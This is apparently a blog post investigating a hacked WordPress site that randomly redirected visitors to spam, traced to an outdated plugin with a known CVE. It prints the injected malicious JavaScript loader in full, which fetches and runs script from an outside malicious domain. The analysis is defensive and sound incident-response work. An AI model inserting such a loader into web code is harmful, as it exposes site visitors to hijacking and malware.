---
title: "Investigating a Compromised WordPress Site: From Random Redirects to Malicious Scripts"
date: 2026-01-07T18:00:00+01:00
description: "Diagnosing a WordPress site compromise that was redirecting visitors to adult content and pharmaceutical spam through injected malicious scripts."
tags: ["WordPress"]
image: "/images/blog/wordpress-compromise.jpg"
---

Recently, my brother visited a local sports complex and mentioned something concerning to the manager: the website was occasionally redirecting visitors to external sites serving adult content, pharmaceuticals, and other spam.

The management team had been aware of the issue for several weeks but couldn't identify the root cause. When my brother told me about this, I decided to take a look from an external perspective to see if I could understand what was happening.

## Initial Assessment

The site was running on WordPress, a CMS I'm quite familiar with. Based on the symptoms (intermittent redirects to spam sites),  I immediately suspected that a plugin could be the cause of the site compromise. This is one of the most common attack vectors for WordPress sites.

### WordPress Update Mechanism

WordPress has a built-in mechanism that can automatically update the core installation and plugins, especially when security vulnerabilities are discovered. However, there's a critical exception: **manually installed plugins don't receive automatic updates**.

This is particularly common with premium plugins purchased outside the official WordPress repository. These plugins require manual updates, creating a significant security gap if site administrators aren't vigilant about checking for updates.

## The Investigation

### Using WPScan

I ran [WPScan](https://wpscan.com/), a security scanner specifically designed for WordPress sites, against the target. The scan revealed something interesting:

- **Plugin**: Custom Facebook Feed Pro
- **Version**: 2.6.7
- **Vulnerability**: [CVE-2021-24508](https://wpscan.com/vulnerability/2b543740-d4b0-49b5-a021-454a3a72162f/)

This vulnerability was almost certainly the initial entry point for the attacker.

## The Malicious Code

When I visited the site, I sent a request to `https://wafsearch.wiki/xml`. Looking at the resources loaded, I could see that the attacker had modified files in other plugins (not just the vulnerable one). The injected code was surprisingly simple but effective:

```javascript
var url = 'https://wafsearch.wiki/xml';
var script = document.createElement('script');
script.src = url;
script.type = 'text/javascript';
script.async = true;
document.getElementsByTagName('head')[0].appendChild(script);
```

### How It Works

This malicious code operates as follows:

1. **Dynamic Script Injection**: The code creates a new `<script>` element and injects it into the page's `<head>` section
2. **External Resource Loading**: It loads content from `https://wafsearch.wiki/xml`
3. **Conditional Behavior**: Based on certain conditions (likely targeting specific users, times, or request patterns), the external URL returns:
   - Malicious JavaScript that performs redirects to spam sites
   - Nothing at all

This is essentially a **web-based malware** that injects advertisements or redirects into the compromised site, similar to adware on desktop systems.

### Verification

According to [SecureFeed's analysis](https://securefeed.com/Content/WebLookup?host=wafsearch.wiki), `wafsearch.wiki` is indeed flagged as a malicious domain used for this type of attack.

## Attack Timeline

Based on my investigation, here's what likely happened:

1. **Initial Compromise**: Attacker exploited the vulnerability in Custom Facebook Feed Pro v2.6.7
2. **Privilege Escalation**: Used the initial foothold to gain file write permissions
3. **Persistence**: Modified multiple plugin files to ensure the malicious code would persist even if one file was cleaned
4. **Payload Delivery**: Injected the script loader code that pulls malicious JavaScript from an external domain
5. **Evasion**: The external script returns different content based on conditions, and, above all, in this case, not be too much of a hassle for users to deal with the problem.

## Conclusion

This investigation demonstrates how a single outdated plugin can lead to a full site compromise.

WordPress powers over 40% of the web, making it an attractive target. Regular security audits, timely updates, and proper security hardening are not optional—they're essential for maintaining a secure web presence.

If you're managing WordPress sites, take this as a reminder to review your plugin inventory today. That outdated premium plugin might be the weakest link in your security chain.
